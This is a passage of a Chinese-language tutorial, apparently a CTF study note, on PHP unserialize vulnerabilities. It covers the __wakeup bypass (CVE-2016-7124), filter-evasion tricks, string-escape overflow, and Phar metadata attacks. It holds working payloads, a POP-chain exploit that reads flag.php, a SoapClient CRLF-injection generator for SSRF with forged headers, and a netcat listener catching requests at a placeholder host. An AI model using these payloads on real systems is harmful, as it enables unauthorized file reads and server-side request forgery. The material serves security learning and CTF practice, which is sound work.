//\u6267\u884cserialize()\u65f6\uff0c\u5148\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 __destruct() //\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u89e6\u53d1 __call() //\u5728\u5bf9\u8c61\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528\u4e0d\u53ef\u8bbf\u95ee\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1 __callStatic() //\u5728\u9759\u6001\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528\u4e0d\u53ef\u8bbf\u95ee\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1 __get() //\u7528\u4e8e\u4ece\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e\u6216\u8005\u4e0d\u5b58\u5728\u8fd9\u4e2a\u952e\u90fd\u4f1a\u8c03\u7528\u6b64\u65b9\u6cd5 __set() //\u7528\u4e8e\u5c06\u6570\u636e\u5199\u5165\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027 __isset() //\u5728\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u8c03\u7528isset()\u6216empty()\u89e6\u53d1 __unset() //\u5728\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u4f7f\u7528unset()\u65f6\u89e6\u53d1 __toString() //\u628a\u7c7b\u5f53\u4f5c\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u89e6\u53d1 __invoke() //\u5f53\u5c1d\u8bd5\u5c06\u5bf9\u8c61\u8c03\u7528\u4e3a\u51fd\u6570\u65f6\u89e6\u53d1 \u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7\u5c0fTrick \u00b6 php7.1+\u53cd\u5e8f\u5217\u5316\u5bf9\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f \u00b6 \u6211\u4eec\u524d\u9762\u8bf4\u4e86\u5982\u679c\u53d8\u91cf\u524d\u662fprotected\uff0c\u5e8f\u5217\u5316\u7ed3\u679c\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a \\x00*\\x00 \u4f46\u5728\u7279\u5b9a\u7248\u672c7.1\u4ee5\u4e0a\u5219\u5bf9\u4e8e\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\u5373\u4f7f\u6ca1\u6709 \\x00*\\x00 \u4e5f\u4f9d\u7136\u4f1a\u8f93\u51fa abc <?php class test{ protected $a; public function __construct(){ $this->a = 'abc'; } public function __destruct(){ echo $this->a; } } unserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'); \u7ed5\u8fc7__wakeup(CVE-2016-7124) \u00b6 \u7248\u672c\uff1a \u200b PHP5 < 5.6.25 \u200b PHP7 < 7.0.10 \u5229\u7528\u65b9\u5f0f\uff1a \u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c \u5bf9\u4e8e\u4e0b\u9762\u8fd9\u6837\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7c7b <?php class test { public $a ; public function __construct (){ $this -> a = 'abc' ; } public function __wakeup (){ $this -> a = '666' ; } public function __destruct (){ echo $this -> a ; } } \u5982\u679c\u6267\u884c unserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'); \u8f93\u51fa\u7ed3\u679c\u4e3a 666 \u800c\u628a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u589e\u5927\u6267\u884c unserialize('O:4:\"test\":2:{s:1:\"a\";s:3:\"abc\";}'); \u8f93\u51fa\u7ed3\u679c\u4e3aabc \u7ed5\u8fc7\u90e8\u5206\u6b63\u5219 \u00b6 preg_match('/^O:\\d+/') \u5339\u914d\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u662f\u5426\u662f\u5bf9\u8c61\u5b57\u7b26\u4e32\u5f00\u5934,\u8fd9\u5728\u66fe\u7ecf\u7684CTF\u4e2d\u4e5f\u51fa\u8fc7\u7c7b\u4f3c\u7684\u8003\u70b9 \u5229\u7528\u52a0\u53f7\u7ed5\u8fc7\uff08\u6ce8\u610f\u5728url\u91cc\u4f20\u53c2\u65f6+\u8981\u7f16\u7801\u4e3a%2B\uff09 serialize(array( a));// a));// a\u4e3a\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5bf9\u8c61(\u5e8f\u5217\u5316\u7ed3\u679c\u5f00\u5934\u662fa\uff0c\u4e0d\u5f71\u54cd\u4f5c\u4e3a\u6570\u7ec4\u5143\u7d20\u7684$a\u7684\u6790\u6784) <?php class test { public $a ; public function __construct (){ $this -> a = 'abc' ; } public function __destruct (){ echo $this -> a . PHP_EOL ; } } function match ( $data ){ if ( preg_match ( '/^O:\\d+/' , $data )){ die ( 'you lose!' ); } else { return $data ; } } $a = 'O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}' ; // +\u53f7\u7ed5\u8fc7 $b = str_replace ( 'O:4' , 'O:+4' , $a ); unserialize ( match ( $b )); // serialize(array($a)); unserialize ( 'a:1:{i:0;O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}}' ); \u5229\u7528\u5f15\u7528 \u00b6 <?php class test { public $a ; public $b ; public function __construct (){ $this -> a = 'abc' ; $this -> b = & $this -> a ; } public function __destruct (){ if ( $this -> a === $this -> b ){ echo 666 ; } } } $a = serialize ( new test ()); \u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5c06 $b \u8bbe\u7f6e\u4e3a $a \u7684\u5f15\u7528\uff0c\u53ef\u4ee5\u4f7f $a \u6c38\u8fdc\u4e0e $b \u76f8\u7b49 16\u8fdb\u5236\u7ed5\u8fc7\u5b57\u7b26\u7684\u8fc7\u6ee4 \u00b6 O:4:\"test\":2:{s:4:\"%00*%00a\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";} \u53ef\u4ee5\u5199\u6210 O:4:\"test\":2:{S:4:\"\\00*\\00\\61\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";} \u8868\u793a\u5b57\u7b26\u7c7b\u578b\u7684s\u5927\u5199\u65f6\uff0c\u4f1a\u88ab\u5f53\u621016\u8fdb\u5236\u89e3\u6790\u3002 \u6211\u8fd9\u91cc\u5199\u4e86\u4e00\u4e2a\u4f8b\u5b50 <?php class test { public $username ; public function __construct (){ $this -> username = 'admin' ; } public function __destruct (){ echo 666 ; } } function check ( $data ){ if ( stristr ( $data , 'username' ) !== False ){ echo ( \"\u4f60\u7ed5\u4e0d\u8fc7\uff01\uff01\" . PHP_EOL ); } else { return $data ; } } // \u672a\u4f5c\u5904\u7406\u524d $a = 'O:4:\"test\":1:{s:8:\"username\";s:5:\"admin\";}' ; $a = check ( $a ); unserialize ( $a ); // \u505a\u5904\u7406\u540e \\75\u662fu\u768416\u8fdb\u5236 $a = 'O:4:\"test\":1:{S:8:\"\\\\75sername\";s:5:\"admin\";}' ; $a = check ( $a ); unserialize ( $a ); PHP\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038 \u00b6 \u60c5\u51b51\uff1a\u8fc7\u6ee4\u540e\u5b57\u7b26\u53d8\u591a \u00b6 \u9996\u5148\u7ed9\u51fa\u672c\u5730\u7684php\u4ee3\u7801\uff0c\u5f88\u7b80\u5355\u4e0d\u505a\u8fc7\u591a\u7684\u89e3\u91ca\uff0c\u5c31\u662f\u628a\u53cd\u5e8f\u5217\u5316\u540e\u7684\u4e00\u4e2ax\u66ff\u6362\u6210\u4e3a\u4e24\u4e2a <?php function change($str){ return str_replace(\"x\",\"xx\",$str); } $name = $_GET['name']; $age = \"I am 11\"; $arr = array($name,$age); echo \"\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\uff1a\"; var_dump(serialize($arr)); echo \"<br/>\"; echo \"\u8fc7\u6ee4\u540e:\"; $old = change(serialize($arr)); $new = unserialize($old); var_dump($new); echo \"<br/>\u6b64\u65f6\uff0cage=$new[1]\"; \u6b63\u5e38\u60c5\u51b5,\u4f20\u5165 name=mao \u5982\u679c\u6b64\u65f6\u591a\u4f20\u5165\u4e00\u4e2ax\u7684\u8bdd\u4f1a\u600e\u6837\uff0c\u6beb\u65e0\u7591\u95ee\u53cd\u5e8f\u5217\u5316\u5931\u8d25\uff0c\u7531\u4e8e\u6ea2\u51fa(s\u672c\u6765\u662f4\u7ed3\u679c\u591a\u4e86\u4e00\u4e2a\u5b57\u7b26\u51fa\u6765)\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u5b9e\u73b0\u5b57\u7b26\u4e32\u9003\u9038 \u9996\u5148\u6765\u770b\u770b\u7ed3\u679c\uff0c\u518d\u6765\u8bb2\u89e3 \u6211\u4eec\u4f20\u5165 name=maoxxxxxxxxxxxxxxxxxxxx\";i:1;s:6:\"woaini\";} \";i:1;s:6:\"woaini\";} \u8fd9\u4e00\u90e8\u5206\u4e00\u5171\u4e8c\u5341\u4e2a\u5b57\u7b26 \u7531\u4e8e\u4e00\u4e2ax\u4f1a\u88ab\u66ff\u6362\u4e3a\u4e24\u4e2a\uff0c\u6211\u4eec\u8f93\u5165\u4e86\u4e00\u517120\u4e2ax\uff0c\u73b0\u5728\u662f40\u4e2a\uff0c\u591a\u51fa\u6765\u768420\u4e2ax\u5176\u5b9e\u53d6\u4ee3\u4e86\u6211\u4eec\u7684\u8fd9\u4e8c\u5341\u4e2a\u5b57\u7b26 \";i:1;s:6:\"woaini\";} \uff0c\u4ece\u800c\u9020\u6210 \";i:1;s:6:\"woaini\";} \u7684\u6ea2\u51fa\uff0c\u800c \" \u95ed\u5408\u4e86\u524d\u4e32\uff0c\u4f7f\u5f97\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u6210\u529f\u9003\u9038\uff0c\u53ef\u4ee5\u88ab\u53cd\u5e8f\u5217\u5316\uff0c\u8f93\u51fa woaini \u6700\u540e\u7684 ;} \u95ed\u5408\u53cd\u5e8f\u5217\u5316\u5168\u8fc7\u7a0b\u5bfc\u81f4\u539f\u6765\u7684 \";i:1;s:7:\"I am 11\";}\" \u88ab\u820d\u5f03\uff0c\u4e0d\u5f71\u54cd\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b` \u60c5\u51b52\uff1a\u8fc7\u6ee4\u540e\u5b57\u7b26\u53d8\u5c11 \u00b6 \u8001\u89c4\u77e9\u5148\u4e0a\u4ee3\u7801,\u5f88\u7b80\u5355\u4e0d\u505a\u8fc7\u591a\u7684\u89e3\u91ca\uff0c\u5c31\u662f\u628a\u53cd\u5e8f\u5217\u5316\u540e\u7684\u4e24\u4e2ax\u66ff\u6362\u6210\u4e3a\u4e00\u4e2a <?php function change ( $str ){ return str_replace ( \"xx\" , \"x\" , $str ); } $arr [ 'name' ] = $_GET [ 'name' ]; $arr [ 'age' ] = $_GET [ 'age' ]; echo \"\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\uff1a\" ; var_dump ( serialize ( $arr )); echo \"<br/>\" ; echo \"\u8fc7\u6ee4\u540e:\" ; $old = change ( serialize ( $arr )); var_dump ( $old ); echo \"<br/>\" ; $new = unserialize ( $old ); var_dump ( $new ); echo \"<br/>\u6b64\u65f6\uff0cage=\" ; echo $new [ 'age' ]; \u6b63\u5e38\u60c5\u51b5\u4f20\u5165 name=mao&age=11 \u7684\u7ed3\u679c \u8001\u89c4\u77e9\u770b\u770b\u6700\u540e\u6784\u9020\u7684\u7ed3\u679c\uff0c\u518d\u7ee7\u7eed\u8bb2\u89e3 \u7b80\u5355\u6765\u8bf4\uff0c\u5c31\u662f\u524d\u9762\u5c11\u4e86\u4e00\u534a\uff0c\u5bfc\u81f4\u540e\u9762\u7684\u5b57\u7b26\u88ab\u5403\u6389\uff0c\u4ece\u800c\u6267\u884c\u4e86\u6211\u4eec\u540e\u9762\u7684\u4ee3\u7801\uff1b \u6211\u4eec\u6765\u770b\uff0c\u8fd9\u90e8\u5206\u662fage\u5e8f\u5217\u5316\u540e\u7684\u7ed3\u679c s:3:\"age\";s:28:\"11\";s:3:\"age\";s:6:\"woaini\";}\" \u7531\u4e8e\u524d\u9762\u662f40\u4e2ax\u6240\u4ee5\u5bfc\u81f4\u5c11\u4e8620\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u9700\u8981\u540e\u9762\u6765\u8865\u4e0a\uff0c \";s:3:\"age\";s:28:\"11 \u8fd9\u4e00\u90e8\u5206\u521a\u597d20\u4e2a\uff0c\u540e\u9762\u7531\u4e8e\u6709 \" \u95ed\u5408\u4e86\u524d\u9762\u56e0\u6b64\u540e\u9762\u7684\u53c2\u6570\u5c31\u53ef\u4ee5\u7531\u6211\u4eec\u81ea\u5b9a\u4e49\u6267\u884c\u4e86 \u5bf9\u8c61\u6ce8\u5165 \u00b6 \u5f53\u7528\u6237\u7684\u8bf7\u6c42\u5728\u4f20\u7ed9\u53cd\u5e8f\u5217\u5316\u51fd\u6570 unserialize() \u4e4b\u524d\u6ca1\u6709\u88ab\u6b63\u786e\u7684\u8fc7\u6ee4\u65f6\u5c31\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u3002\u56e0\u4e3aPHP\u5141\u8bb8\u5bf9\u8c61\u5e8f\u5217\u5316\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u63d0\u4ea4\u7279\u5b9a\u7684\u5e8f\u5217\u5316\u7684\u5b57\u7b26\u4e32\u7ed9\u4e00\u4e2a\u5177\u6709\u8be5\u6f0f\u6d1e\u7684 unserialize \u51fd\u6570\uff0c\u6700\u7ec8\u5bfc\u81f4\u4e00\u4e2a\u5728\u8be5\u5e94\u7528\u8303\u56f4\u5185\u7684\u4efb\u610fPHP\u5bf9\u8c61\u6ce8\u5165\u3002 \u5bf9\u8c61\u6f0f\u6d1e \u51fa\u73b0\u5f97\u6ee1\u8db3\u4e24\u4e2a\u524d\u63d0 1\u3001 unserialize \u7684\u53c2\u6570\u53ef\u63a7\u3002 2\u3001 \u4ee3\u7801\u91cc\u6709\u5b9a\u4e49\u4e00\u4e2a\u542b\u6709\u9b54\u672f\u65b9\u6cd5\u7684\u7c7b\uff0c\u5e76\u4e14\u8be5\u65b9\u6cd5\u91cc\u51fa\u73b0\u4e00\u4e9b\u4f7f\u7528\u7c7b\u6210\u5458\u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\u7684\u5b58\u5728\u5b89\u5168\u95ee\u9898\u7684\u51fd\u6570\u3002 \u6bd4\u5982\u8fd9\u4e2a\u4f8b\u5b50 <?php class A { var $test = \"y4mao\" ; function __destruct (){ echo $this -> test ; } } $a = 'O:1:\"A\":1:{s:4:\"test\";s:5:\"maomi\";}' ; unserialize ( $a ); \u5728\u811a\u672c\u8fd0\u884c\u7ed3\u675f\u540e\u4fbf\u4f1a\u8c03\u7528 _destruct \u51fd\u6570\uff0c\u540c\u65f6\u4f1a\u8986\u76d6test\u53d8\u91cf\u8f93\u51fa maomi POP\u94fe\u7684\u6784\u9020\u5229\u7528 \u00b6 POP\u94fe\u7b80\u5355\u4ecb\u7ecd \u00b6 \u524d\u9762\u6240\u8bb2\u89e3\u7684\u5e8f\u5217\u5316\u653b\u51fb\u66f4\u591a\u7684\u662f\u9b54\u672f\u65b9\u6cd5\u4e2d\u51fa\u73b0\u4e00\u4e9b\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u56e0\u4e3a\u81ea\u52a8\u8c03\u7528\u800c\u89e6\u53d1\u6f0f\u6d1e\uff0c\u4f46\u5982\u679c\u5173\u952e\u4ee3\u7801\u4e0d\u5728\u9b54\u672f\u65b9\u6cd5\u4e2d\uff0c\u800c\u662f\u5728\u4e00\u4e2a\u7c7b\u7684\u666e\u901a\u65b9\u6cd5\u4e2d\u3002\u8fd9\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u5bfb\u627e\u76f8\u540c\u7684\u51fd\u6570\u540d\u5c06\u7c7b\u7684\u5c5e\u6027\u548c\u654f\u611f\u51fd\u6570\u7684\u5c5e\u6027\u8054\u7cfb\u8d77\u6765 \u7b80\u5355\u6848\u4f8b\u8bb2\u89e3 \u00b6 \u9996\u5148\u770b\u770b\u7b80\u5355\u7684MRCTF2020-Ezpop,\u4e0d\u5e26\u5927\u5bb6\u4e00\u4e00\u8bfb\u4ee3\u7801\u4e86\uff0c\u81ea\u5df1\u89e3\u51b3 <?php class Modifier { protected $var ; public function append ( $value ){ include ( $value ); } public function __invoke (){ $this -> append ( $this -> var ); } } class Show { public $source ; public $str ; public function __construct ( $file = 'index.php' ){ $this -> source = $file ; echo 'Welcome to ' . $this -> source . \"<br>\" ; } public function __toString (){ return $this -> str -> source ; } public function __wakeup (){ if ( preg_match ( \"/gopher|http|file|ftp|https|dict|\\.\\./i\" , $this -> source )) { echo \"hacker\" ; $this -> source = \"index.php\" ; } } } class Test { public $p ; public function __construct (){ $this -> p = array (); } public function __get ( $key ){ $function = $this -> p ; return $function (); } } \u8fd9\u91cc\u6211\u76f4\u63a5\u8bf4\u5229\u7528\u601d\u8def\uff0c\u9996\u5148\u9006\u5411\u5206\u6790\uff0c\u6211\u4eec\u6700\u7ec8\u662f\u5e0c\u671b\u901a\u8fc7 Modifier \u5f53\u4e2d\u7684 append \u65b9\u6cd5\u5b9e\u73b0\u672c\u5730\u6587\u4ef6\u5305\u542b\u8bfb\u53d6\u6587\u4ef6\uff0c\u56de\u6eaf\u5230\u8c03\u7528\u5b83\u7684 __invoke \uff0c\u5f53\u6211\u4eec \u5c06\u5bf9\u8c61\u8c03\u7528\u4e3a\u51fd\u6570\u65f6\u89e6\u53d1 ,\u53d1\u73b0\u5728 Test \u7c7b\u5f53\u4e2d\u7684 __get \u65b9\u6cd5\uff0c\u518d\u56de\u6eaf\u5230 Show \u5f53\u4e2d\u7684 __toString \uff0c\u518d\u56de\u6eaf\u5230 Show \u5f53\u4e2d\u7684 __construct \u5f53\u4e2d\u6709 echo $this->source \u53ef\u4ee5\u8c03\u7528 __toString \u56e0\u6b64\u4e0d\u96be\u6784\u9020pop\u94fe <?php ini_set ( 'memory_limit' , '-1' ); class Modifier { protected $var = 'php://filter/read=convert.base64-encode/resource=flag.php' ; } class Show { public $source ; public $str ; public function __construct ( $file ){ $this -> source = $file ; $this -> str = new Test (); } } class Test { public $p ; public function __construct (){ $this -> p = new Modifier (); } } $a = new Show ( 'aaa' ); $a = new Show ( $a ); echo urlencode ( serialize ( $a )); PHP\u539f\u751f\u7c7b\u53cd\u5e8f\u5217\u5316\u5229\u7528 \u00b6 SoapClient\u4ecb\u7ecd \u00b6 \u7efc\u8ff0\uff1a php\u5728\u5b89\u88c5php-soap\u62d3\u5c55\u540e\uff0c\u53ef\u4ee5\u53cd\u5e8f\u5217\u5316\u539f\u751f\u7c7bSoapClient\uff0c\u6765\u53d1\u9001http post\u8bf7\u6c42\u3002 \u5fc5\u987b\u8c03\u7528SoapClient\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u89e6\u53d1SoapClient\u7684__call\u9b54\u672f\u65b9\u6cd5\u3002 \u901a\u8fc7CRLF\u6765\u6dfb\u52a0\u8bf7\u6c42\u4f53\uff1aSoapClient\u53ef\u4ee5\u6307\u5b9a\u8bf7\u6c42\u7684user-agent\u5934\uff0c\u901a\u8fc7\u6dfb\u52a0\u6362\u884c\u7b26\u7684\u5f62\u5f0f\u6765\u52a0\u5165\u5176\u4ed6\u8bf7\u6c42\u5185\u5bb9 SoapClient\u91c7\u7528\u4e86HTTP\u4f5c\u4e3a\u5e95\u5c42\u901a\u8baf\u534f\u8bae\uff0cXML\u4f5c\u4e3a\u6570\u636e\u4f20\u9001\u7684\u683c\u5f0f\uff0c\u5176\u91c7\u7528\u4e86SOAP\u534f\u8bae( SOAP \u662f\u4e00\u79cd\u7b80\u5355\u7684\u57fa\u4e8e XML \u7684\u534f\u8bae,\u5b83\u4f7f\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7 HTTP \u6765\u4ea4\u6362\u4fe1\u606f)\uff0c\u5176\u6b21\u6211\u4eec\u77e5\u9053\u67d0\u4e2a\u5b9e\u4f8b\u5316\u7684\u7c7b\uff0c\u5982\u679c\u53bb\u8c03\u7528\u4e86\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u51fd\u6570\uff0c\u4f1a\u53bb\u8c03\u7528 __call \u65b9\u6cd5\uff0c\u5177\u4f53\u8be6\u7ec6\u7684\u4fe1\u606f\u5927\u5bb6\u53ef\u4ee5\u53bb\u641c\u7d22\u5f15\u64ce\u770b\u770b\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0 \u5229\u7528\u65b9\u5f0f \u00b6 \u4e0b\u9762\u9996\u5148\u5728\u6211\u7684VPS\u4e0a\u9762\u5f00\u542f\u76d1\u542c nc -lvvp 9328 <?php $a = new SoapClient(null,array('uri'=>'bbb', 'location'=>'http://xxxx.xxx.xx:9328')); $b = serialize($a); $c = unserialize($b); $c -> not_a_function();//\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u8ba9SoapClient\u8c03\u7528__call \u8fd0\u884c\u4e0a\u9762\u7684php\u7a0b\u5e8f\uff0c\u5728\u6211\u7684vps\u4e0a\u9762\u5956\u4f1a\u6355\u83b7\u76d1\u542c \u4ece\u4e0a\u9762\u8fd9\u5f20\u56fe\u53ef\u4ee5\u770b\u5230\uff0c SOAPAction \u5904\u662f\u6211\u4eec\u7684\u53ef\u63a7\u53c2\u6570\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u6ce8\u5165\u6211\u4eec\u81ea\u5df1\u6076\u610f\u6784\u9020\u7684 CRLF \u5373\u63d2\u5165 \\r\\n \uff0c\u5229\u7528\u6210\u529f\uff01 \u4f46\u662f\u8fd8\u6709\u4e2a\u95ee\u9898\u6211\u4eec\u518d\u53d1\u9001POST\u6570\u636e\u7684\u65f6\u5019\u662f\u9700\u8981\u9075\u5faaHTTP\u534f\u8bae\uff0c\u6307\u5b9a\u8bf7\u6c42\u5934 Content-Type: application/x-www-form-urlencoded \u4f46 Content-Type \u5728 SOAPAction \u7684\u4e0a\u9762\uff0c\u5c31\u65e0\u6cd5\u63a7\u5236 Content-Type ,\u4e5f\u5c31\u4e0d\u80fd\u63a7\u5236POST\u7684\u6570\u636e \u63a5\u4e0b\u6765\u6211\u4eec\u5b9e\u9a8c\u4e00\u4e0b \u5b9e\u6218 \u00b6 \u53cd\u5e8f\u5217\u5316\u6211\u4eec\u4f20\u5165\u7684 vip \u6267\u884cgetFlag\u51fd\u6570(\u8ff7\u60d1\u4eba\u7684\u51fd\u6570) <?php highlight_file ( __FILE__ ); $vip = unserialize ( $_GET [ 'vip' ]); $vip -> getFlag (); //flag.php $xff = explode ( ',' , $_SERVER [ 'HTTP_X_FORWARDED_FOR' ]); array_pop ( $xff ); $ip = array_pop ( $xff ); \u200b \u200b if ( $ip !== '127.0.0.1' ){ die ( 'error' ); } else { $token = $_POST [ 'token' ]; if ( $token == 'ctfshow' ){ file_put_contents ( 'flag.txt' , $flag ); } } \u7531\u4e8e\u670d\u52a1\u5668\u5e26\u6709cloudfare\u4ee3\u7406\uff0c\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u672c\u5730\u6784\u9020XFF\u5934\u5b9e\u73b0\u7ed5\u8fc7\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528SoapClient\u4e0eCRLF\u5b9e\u73b0SSRF\u8bbf\u95ee 127.0.0.1/flag.php ,\u5373\u53ef\u7ed5\u8fc7cloudfare\u4ee3\u7406 <?php $target = 'http://127.0.0.1/flag.php' ; $post_string = 'token=ctfshow' ; $headers = array ( 'X-Forwarded-For: 127.0.0.1,127.0.0.1' , 'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d' ); $b = new SoapClient ( null , array ( 'location' => $target , 'user_agent' => 'y4tacker^^Content-Type: application/x-www-form-urlencoded^^' . join ( '^^' , $headers ) . '^^Content-Length: ' . ( string ) strlen ( $post_string ) . '^^^^' . $post_string , 'uri' => \"aaab\" )); $aaa = serialize ( $b ); $aaa = str_replace ( '^^' , \" \\r\\n \" , $aaa ); $aaa = str_replace ( '&' , '&' , $aaa ); echo urlencode ( $aaa ); \u63a5\u4e0b\u6765\u8bbf\u95ee flag.txt \u5373\u53ef Phar\u53cd\u5e8f\u5217\u5316 \u00b6 phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\u3002\u5f53\u53d7\u5f71\u54cd\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u8c03\u7528phar\u6587\u4ef6\u65f6\uff0c\u4f1a\u81ea\u52a8\u53cd\u5e8f\u5217\u5316meta-data\u5185\u7684\u5185\u5bb9\u3002 \u4ec0\u4e48\u662fphar\u6587\u4ef6 \u00b6 \u5728\u8f6f\u4ef6\u4e2d\uff0cPHAR\uff08PHP\u5f52\u6863\uff09\u6587\u4ef6\u662f\u4e00\u79cd\u6253\u5305\u683c\u5f0f\uff0c\u901a\u8fc7\u5c06\u8bb8\u591aPHP\u4ee3\u7801\u6587\u4ef6\u548c\u5176\u4ed6\u8d44\u6e90\uff08\u4f8b\u5982\u56fe\u50cf\uff0c\u6837\u5f0f\u8868\u7b49\uff09\u6346\u7ed1\u5230\u4e00\u4e2a\u5f52\u6863\u6587\u4ef6\u4e2d\u6765\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u548c\u5e93\u7684\u5206\u53d1 php\u901a\u8fc7\u7528\u6237\u5b9a\u4e49\u548c\u5185\u7f6e\u7684\u201c\u6d41\u5305\u88c5\u5668\u201d\u5b9e\u73b0\u590d\u6742\u7684\u6587\u4ef6\u5904\u7406\u529f\u80fd\u3002\u5185\u7f6e\u5305\u88c5\u5668\u53ef\u7528\u4e8e\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\uff0c\u5982(fopen(),copy(),file_exists()\u548cfilesize()\u3002 phar://\u5c31\u662f\u4e00\u79cd\u5185\u7f6e\u7684\u6d41\u5305\u88c5\u5668\u3002 php\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u6d41\u5305\u88c5\u5668\u5982\u4e0b\uff1a file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728\u7528\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u65f6\u9ed8\u8ba4\u5c31\u4f7f\u7528\u8be5\u5305\u88c5\u5668 http:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740 ftp:// \u2014 \u8bbf\u95ee FTP(s) URLs php:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09 zlib:// \u2014 \u538b\u7f29\u6d41 data:// \u2014 \u6570\u636e\uff08RFC 2397\uff09 glob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f phar:// \u2014 PHP \u5f52\u6863 ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 \u97f3\u9891\u6d41 expect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41 phar\u6587\u4ef6\u7684\u7ed3\u6784 \u00b6 stub:phar\u6587\u4ef6\u7684\u6807\u5fd7\uff0c\u5fc5\u987b\u4ee5 xxx __HALT_COMPILER();?> \u7ed3\u5c3e\uff0c\u5426\u5219\u65e0\u6cd5\u8bc6\u522b\u3002xxx\u53ef\u4ee5\u4e3a\u81ea\u5b9a\u4e49\u5185\u5bb9\u3002 manifest:phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u6f0f\u6d1e\u5229\u7528\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 content:\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9 signature (\u53ef\u7a7a):\u7b7e\u540d\uff0c\u653e\u5728\u672b\u5c3e\u3002 \u5982\u4f55\u751f\u6210\u4e00\u4e2aphar\u6587\u4ef6\uff1f\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u53c2\u8003\u4f8b\u5b50 <?php class Test { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new Test (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString 